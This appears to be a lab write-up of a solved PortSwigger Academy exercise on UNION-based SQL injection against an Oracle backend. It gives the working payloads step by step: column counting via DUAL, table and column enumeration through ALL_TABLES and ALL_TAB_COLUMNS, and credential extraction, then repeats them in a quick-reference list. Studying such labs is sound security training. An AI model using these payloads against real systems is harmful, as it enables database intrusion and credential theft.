# PortSwigger SQL Injection: Listing Database Contents on Oracle

**Date:** 25 September 2026  
**Platform:** PortSwigger Web Security Academy  
**Lab:** SQL injection attack, listing the database contents on Oracle  
**Difficulty:** Practitioner  
**Status:** Solved

---

## 1. Lab Overview

This lab contains a SQL injection vulnerability in the product category filter.

The application uses an Oracle database, and the results of the SQL query are reflected in the application response. This makes it possible to use a `UNION SELECT` attack to retrieve information from other database tables.

The goal of the lab was to:

1. Identify the number of columns returned by the vulnerable query.
2. Determine which columns can contain text.
3. Enumerate the database tables.
4. Identify the table containing user credentials.
5. Enumerate the columns in that table.
6. Extract usernames and passwords.
7. Log in as the `administrator` user.

---

# 2. Tools Used

- Burp Suite
- Burp Repeater
- Web browser
- PortSwigger Web Security Academy lab
- Oracle SQL syntax

---

# 3. Understanding the Vulnerability

The vulnerable functionality was the product category filter.

A normal request looked similar to:

```http
GET /filter?category=Corporate+gifts HTTP/2
```

The `category` parameter is incorporated into a backend SQL query.

Because the parameter is vulnerable to SQL injection, additional SQL syntax can be inserted into the request.

The main technique used in this lab was a `UNION SELECT` attack.

A `UNION` allows the results of another `SELECT` statement to be combined with the results of the original query.

---

# 4. Step 1 — Find the Vulnerable Request

First, a product category was selected from the lab application.

The resulting request was captured using:

```text
Burp Suite → Proxy → HTTP history
```

The relevant request was:

```http
GET /filter?category=Corporate+gifts HTTP/2
```

This request was sent to:

```text
Burp Suite → Repeater
```

Repeater allowed the request to be modified and sent repeatedly while testing different SQL injection payloads.

---

# 5. Step 2 — Determine the Number of Columns

The first payload used was:

```sql
' UNION SELECT NULL,NULL FROM dual--
```

URL-encoded/request form:

```text
'+UNION+SELECT+NULL,NULL+FROM+dual--
```

The request returned:

```text
HTTP/2 200 OK
```

and the application displayed the injected page normally.

This indicated that the `UNION SELECT` was accepted with **two columns**.

## Why `dual` was required

The target database is Oracle.

Oracle requires a `FROM` clause for a `SELECT` statement.

Oracle provides a built-in table called:

```text
DUAL
```

Therefore:

```sql
SELECT NULL,NULL FROM dual
```

is valid Oracle syntax.

---

# 6. Step 3 — Determine Which Columns Accept Text

Next, the following payload was used:

```sql
' UNION SELECT 'abc','def' FROM dual--
```

Request form:

```text
'+UNION+SELECT+'abc','def'+FROM+dual--
```

The response displayed:

```html
<th>abc</th>
<td>def</td>
```

This confirmed that:

```text
Column 1 → accepts/displays text
Column 2 → accepts/displays text
```

Therefore, both columns could be used to display information obtained from the database.

---

# 7. Step 4 — Enumerate Database Tables

The next objective was to find the table containing user credentials.

Oracle provides metadata through views such as:

```text
ALL_TABLES
```

The following payload was used:

```sql
' UNION SELECT table_name,NULL FROM all_tables--
```

Request form:

```text
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
```

This returned a list of table names.

Among the results was:

```text
USERS_QBVJFF
```

This was identified as the table containing the user information.

---

# 8. Step 5 — Enumerate the Columns

After identifying:

```text
USERS_QBVJFF
```

the next step was to determine which columns contained usernames and passwords.

Oracle provides column metadata through:

```text
ALL_TAB_COLUMNS
```

The following payload was used:

```sql
' UNION SELECT column_name,NULL
FROM all_tab_columns
WHERE table_name='USERS_QBVJFF'--
```

Request form:

```text
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_QBVJFF'--
```

The response showed three columns:

```text
EMAIL
PASSWORD_IEXMUJ
USERNAME_IWSXBZ
```

The relevant columns were therefore:

```text
Username → USERNAME_IWSXBZ
Password → PASSWORD_IEXMUJ
```

---

# 9. Step 6 — Extract Usernames and Passwords

Now that the table and column names were known, the actual credential data could be retrieved.

The final SQL injection payload was:

```sql
' UNION SELECT USERNAME_IWSXBZ,PASSWORD_IEXMUJ
FROM USERS_QBVJFF--
```

Request form:

```text
'+UNION+SELECT+USERNAME_IWSXBZ,PASSWORD_IEXMUJ+FROM+USERS_QBVJFF--
```

The application returned the following lab credentials:

```text
administrator → [LAB PASSWORD]
carlos        → [LAB PASSWORD]
wiener        → [LAB PASSWORD]
```

> Sensitive lab credentials are represented as `[LAB PASSWORD]` in this documentation rather than storing the actual password in the GitHub README.

The important account for the lab was:

```text
administrator
```

---

# 10. Step 7 — Log in as Administrator

The extracted administrator credentials were entered into:

```text
My account → Login
```

Username:

```text
administrator
```

Password:

```text
[LAB PASSWORD]
```

The login succeeded and the PortSwigger lab changed to:

```text
Solved
```

---

# 11. Complete Attack Chain

The entire attack can be summarized as:

```text
Vulnerable category parameter
            ↓
       SQL Injection
            ↓
      UNION SELECT
            ↓
   Determine column count
            ↓
      2 columns found
            ↓
   Test text-compatible columns
            ↓
   Both columns accept text
            ↓
      Query ALL_TABLES
            ↓
       USERS_QBVJFF
            ↓
   Query ALL_TAB_COLUMNS
            ↓
 EMAIL
 PASSWORD_IEXMUJ
 USERNAME_IWSXBZ
            ↓
Extract usernames/passwords
            ↓
      administrator
            ↓
       Login
            ↓
       LAB SOLVED
```

---

# 12. Payload Summary

## Test 1 — Two columns

```sql
' UNION SELECT NULL,NULL FROM dual--
```

Purpose:

```text
Determine whether the query returns two columns.
```

---

## Test 2 — Text columns

```sql
' UNION SELECT 'abc','def' FROM dual--
```

Purpose:

```text
Determine which columns can display text.
```

Result:

```text
abc
def
```

---

## Test 3 — Enumerate tables

```sql
' UNION SELECT table_name,NULL FROM all_tables--
```

Purpose:

```text
Retrieve accessible Oracle table names.
```

Important result:

```text
USERS_QBVJFF
```

---

## Test 4 — Enumerate columns

```sql
' UNION SELECT column_name,NULL
FROM all_tab_columns
WHERE table_name='USERS_QBVJFF'--
```

Purpose:

```text
Find the columns belonging to the users table.
```

Important results:

```text
EMAIL
PASSWORD_IEXMUJ
USERNAME_IWSXBZ
```

---

## Test 5 — Extract credentials

```sql
' UNION SELECT USERNAME_IWSXBZ,PASSWORD_IEXMUJ
FROM USERS_QBVJFF--
```

Purpose:

```text
Retrieve usernames and passwords from the users table.
```

---

# 13. What I Learned

### 1. UNION SQL Injection

A `UNION SELECT` can be used to append another query to the original query and retrieve data from another table when the injection point is suitable.

### 2. Column Count Matters

The number of columns returned by both sides of a `UNION` must match.

In this lab:

```text
Number of columns = 2
```

### 3. Data Types Matter

The selected values also need to be compatible with the corresponding columns.

Testing:

```sql
'abc'
'def'
```

showed that both output columns could contain text.

### 4. Oracle Metadata

Two important Oracle metadata views used in this lab were:

```text
ALL_TABLES
ALL_TAB_COLUMNS
```

`ALL_TABLES` helped identify available tables, while `ALL_TAB_COLUMNS` helped identify the columns within the target table.

### 5. Oracle DUAL

Oracle requires a `FROM` clause for a `SELECT` statement.

The built-in:

```text
DUAL
```

table can be used when no real table is required.

### 6. SQL Injection Can Lead to Credential Disclosure

The vulnerability allowed database metadata to be enumerated and ultimately exposed credentials stored in the application's users table.

---

# 14. Key Commands / Payloads Used

For quick reference:

```sql
' UNION SELECT NULL,NULL FROM dual--
```

```sql
' UNION SELECT 'abc','def' FROM dual--
```

```sql
' UNION SELECT table_name,NULL FROM all_tables--
```

```sql
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_QBVJFF'--
```

```sql
' UNION SELECT USERNAME_IWSXBZ,PASSWORD_IEXMUJ FROM USERS_QBVJFF--
```

These were entered into the vulnerable:

```text
category
```

parameter through Burp Repeater.

---

